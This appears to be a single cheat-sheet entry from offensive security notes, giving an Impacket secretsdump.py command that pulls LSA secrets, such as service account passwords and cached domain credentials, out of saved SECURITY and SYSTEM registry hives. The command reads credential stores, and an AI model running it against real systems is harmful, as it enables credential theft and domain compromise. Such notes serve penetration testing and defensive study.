
Use SECURITY Hive with SYSTEM for LSA Secrets:

```bash
/opt/impacket/examples/secretsdump.py -system /tmp/system-reg -security /tmp/security-reg LOCAL
```
    
    Explanation: Leverages SECURITY and SYSTEM hives to extract LSA secrets, including service account passwords and cached domain credentials.